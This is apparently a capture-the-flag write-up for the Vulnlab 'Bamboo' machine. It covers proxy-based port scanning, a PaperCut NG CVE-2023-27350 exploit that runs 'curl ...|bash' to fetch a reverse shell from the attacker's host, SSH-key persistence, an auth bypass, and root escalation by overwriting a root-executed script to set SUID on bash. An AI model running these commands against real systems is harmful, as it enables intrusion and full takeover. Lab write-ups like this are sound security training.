@@ -1,0 +1,334 @@
+
+
+![](https://images-ext-1.discordapp.net/external/PDLWokWEFAzwWIntBYuw_bmLGgLgkKRvTusJomhPbRM/https/vulnlab-assets.s3.eu-central-1.amazonaws.com/bamboo_slide.png?format=webp&quality=lossless)
+
+# Bamboo
+---
+- OS : **Linux**
+- Severity : **Medium**
+- Release date : **2023 May 30**
+- User blood : **jkr** 0H 31M
+- System blood : **jkr** 1H 17M
+- IP : **10.10.66.141**
+# Enumeration
+---
+## nmap
+
+```bash
+vaillant@sss ~
+❯ cat nmap
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
+|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
+3128/tcp open  http-proxy Squid http proxy 5.2
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/5.2
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: specialized|storage-misc
+Running (JUST GUESSING): Crestron 2-Series (86%), HP embedded (85%)
+OS CPE: cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
+Aggressive OS guesses: Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   23.50 ms 10.8.0.1
+2   23.83 ms bamboo.vl (10.10.66.141)
+```
+
+> add `bamboo.vl`  in /etc/hosts
+
+# squid
+
+https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
+
+With the Squid proxy port open, we may be able to use it to look inside.
+So I am going to config my proxychains first :
+
+```bash
+vaillant@sss ~
+❯ cat /etc/proxychains.conf | tail -n3                            
+# socks5 127.0.0.1 1080
+
+http 10.10.66.141 3128
+```
+
+Then I am going to use one of xct's tool named Squidscan :
+
+https://gist.github.com/xct/597d48456214b15108b2817660fdee00
+
+We have just to edit `squidscan.go` like this :
+
+```go
+var (
+        proxyURL = "http://10.10.66.141:3128"
+        numWorkers = 100
+        numPorts = 65535
+)
+```
+
+Then build the tool.
+
+When running it, we got this :
+
+```bash
+vaillant@sss ~/squid
+❯ ./squidscan
+Port 22 found!
+8636 / 65535 [----->_____________________________________] 13.18% 1833 p/sPort 9173 found!
+Port 9174 found!
+8995 / 65535 [----->_____________________________________] 13.73% 1833 p/sPort 9195 found!
+Port 9192 found!
+14226 / 65535 [--------->________________________________] 21.71% 1839 p/sPort 9191 found!
+65532 / 65535 [------------------------------------------->] 100.00% 1 p/s
+```
+
+So we can now nmap through proxychains to make a better enum :
+
+```bash
+vaillant@sss ~/squid
+❯ proxychains -q nmap -sC -sV -p22,9173,9174,9195,9192,9191 127.0.0.1 --min-rate=5000
+
+PORT     STATE SERVICE      VERSION
+22/tcp   open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
+|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
+9173/tcp open  http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+9174/tcp open  ssl/http     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| http-title: Site doesn't have a title.
+|_Requested resource was /admin/
+| ssl-cert: Subject: organizationName=PaperCut Software International Pty Ltd./stateOrProvinceName=VIC/countryName=AU
+| Not valid before: 2023-05-26T13:10:12
+|_Not valid after:  2033-05-26T13:10:12
+9191/tcp open  sun-as-jpda?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
+|   GetRequest, HTTPOptions:
+|     HTTP/1.1 302 Found
+|     Date: Mon, 22 Apr 2024 17:53:18 GMT
+|     Location: http://127.0.0.1:9191/user
+|   Help:
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
+|   RPCCheck:
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
+|   RTSPRequest:
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   SSLSessionReq:
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
+|   TerminalServerCookie:
+|     HTTP/1.1 400 Illegal character CNTL=0x3
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x3</pre>
+9192/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=bamboo/organizationName=unknown/stateOrProvinceName=unknown/countryName=unknown
+| Not valid before: 2023-05-25T13:09:59
+|_Not valid after:  2038-01-18T03:14:07
+9195/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=bamboo/organizationName=unknown/stateOrProvinceName=unknown/countryName=unknown
+| Subject Alternative Name: DNS:bamboo
+| Not valid before: 2023-05-25T13:10:17
+|_Not valid after:  2030-05-26T13:10:17
+|_ssl-date: TLS randomness does not represent time
+```
+
+Nice. We got some better informations now.
+PaperCut NG is active on port 9191. 
+
+accessing [http://127.0.0.1:9191](http://127.0.0.1:9191/) (through the same proxy ofc), we can see that it's using PaperCut NG version is 22.0.
+searching for related CVEs, we find this PoC for CVE-2023-27350 on GitHub: [https://github.com/horizon3ai/CVE-2023-27350](https://github.com/horizon3ai/CVE-2023-27350)
+
+This is pretty simple to use, the PoC is really good, so I've done it like this:
+```bash
+proxychains -q python3 CVE-2023-27350.py --url 'http://10.10.66.141:9191' --command 'curl 10.8.1.18/rev.sh|bash'
+
+Then I received a shell:
+
+(remote) papercut@bamboo:/home/papercut/server$ id
+uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
+```
+
+Time to privesc.
+
+# privesc
+
+So first of all i will make a port forward & a persistence via SSH.
+
+```bash
+(remote) papercut@bamboo:/home/papercut$ mkdir .ssh
+(remote) papercut@bamboo:/home/papercut$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAJl2IXTOqircRTrxdyhfbgv8Ddl5Thv6yz3SoiKSLf7 vaillant@sss" > .ssh/authorized_keys
+```
+
+Then now I can connect & port forward using my key:
+
+```bash
+vaillant@sss ~
+❯ ssh -i .ssh/id_ed25519 -L 9191:127.0.0.1:9191 papercut@bamboo.vl                                                                      
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1025-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Apr 22 18:24:31 UTC 2024
+
+  System load:  0.0               Processes:             113
+  Usage of /:   39.9% of 7.57GB   Users logged in:       0
+  Memory usage: 53%               IPv4 address for ens5: 10.10.66.141
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+19 updates can be applied immediately.
+13 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Apr 22 18:19:47 2024 from 10.8.1.18
+papercut@bamboo:~$
+```
+
+We can access http://127.0.0.1:9191/
+But we need credentials, bypass login etc to do something.
+
+After spending some time researching, we found this:
+
+https://www.exploit-db.com/exploits/51391
+
+This appears to be an auth bypass, with our version of PaperCut NG/MG.
+
+Running the exploit & we got this:
+
+```bash
+vaillant@sss ~
+❯ python Downloads/51391.py                                       
+
+Enter the ip address: 127.0.0.1
+Version: 22.0.6
+Vulnerable version
+Step 1 visit this url first in your browser: http://127.0.0.1:9191/app?service=page/SetupCompleted
+Step 2 visit this url in your browser to bypass the login page : http://127.0.0.1:9191/app?service=page/Dashboard
+```
+
+It works !
+We bypassed the login.
+
+On this last step, I was spoiled by a friend, so I very quickly understood what to do.
+I set up a spy to see what was happening on the machine when I was using the PaperCut NG, and completely randomly I came across this:
+
+```bash
+(remote) papercut@bamboo:/home/papercut$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2024/04/22 18:30:20 CMD: UID=1001  PID=1864   | ./pspy64
+2024/04/22 18:30:20 CMD: UID=0     PID=1832   |
+2024/04/22 18:30:20 CMD: UID=1001  PID=1791   | -bash
+2024/04/22 18:30:20 CMD: UID=1001  PID=1790   | sshd: papercut@pts/1                                                                                     
+2024/04/22 18:30:20 CMD: UID=0     PID=1732   | sshd: papercut [priv]
+2024/04/22 18:30:20 CMD: UID=0     PID=2      |
+2024/04/22 18:30:20 CMD: UID=0     PID=1      | /sbin/init
+2024/04/22 18:32:42 CMD: UID=0     PID=1879   | bash -c "/home/papercut/server/bin/linux-x64/server-command" get-config health.api.key
+2024/04/22 18:32:42 CMD: UID=0     PID=1881   | cat /proc/1/comm
+2024/04/22 18:32:42 CMD: UID=0     PID=1882   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:42 CMD: UID=0     PID=1883   |
+2024/04/22 18:32:42 CMD: UID=0     PID=1889   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:42 CMD: UID=0     PID=1888   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:42 CMD: UID=0     PID=1887   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:42 CMD: UID=0     PID=1890   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:44 CMD: UID=0     PID=1909   | /usr/bin/python3 -Es /usr/bin/lsb_release -sd
+2024/04/22 18:32:47 CMD: UID=0     PID=1919   |
+2024/04/22 18:32:47 CMD: UID=0     PID=1917   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:47 CMD: UID=0     PID=1921   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:47 CMD: UID=0     PID=1927   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:47 CMD: UID=0     PID=1926   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:47 CMD: UID=0     PID=1925   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+2024/04/22 18:32:47 CMD: UID=0     PID=1928   | /home/papercut/runtime/linux-x64/jre/bin/java -Djava.io.tmpdir=/home/papercut/server/tmp -Dserver.home=/home/papercut/server -Djava.awt.headless=true -Djava.locale.providers=COMPAT,SPI -Dlog4j.configurationFile=file:/home/papercut/server/lib/log4j2-command.properties -Xverify:none biz.papercut.pcng.server.ServerCommand get-config health.api.key
+2024/04/22 18:32:48 CMD: UID=0     PID=1947   | /usr/bin/python3 -Es /usr/bin/lsb_release -sd
+```
+
+```bash
+2024/04/22 18:32:47 CMD: UID=0     PID=1925   | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key
+```
+
+On the website, in this place: http://127.0.0.1:9191/app?service=page/PrintDeploy
+
+When I am doing "### Import Mobility Print queues" --> Start Importing Mobility Print printers --> Refresh server, this command appears:
+`/bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key`
+
+So if we can modify server-command, we when we click on "refresh server", this will execute our malicious server-command?
+
+We can write it:
+```bash
+(remote) papercut@bamboo:/home/papercut$ ls -lah /home/papercut/server/bin/linux-x64/server-command
+-rwxr-xr-x 1 papercut papercut 493 Sep 29  2022 /home/papercut/server/bin/linux-x64/server-command
+```
+
+Good news, we just have to modify this and make a "refresh server".
+I will just try to add a SUID to /bin/bash, so if it's executed, we just have to do `bash -p` to get root.
+
+```bash
+(remote) papercut@bamboo:/home/papercut$ echo "chmod +s /bin/bash" > /home/papercut/server/bin/linux-x64/server-command
+```
+
+Then after doing "refresh server", we can just `bash -p` to get root now.
+
+```bash
+(remote) papercut@bamboo:/home/papercut$ bash -p
+(remote) root@bamboo:/home/papercut# id
+uid=1001(papercut) gid=1001(papercut) euid=0(root) egid=0(root) groups=0(root),1001(papercut)
+```
+
+GG !
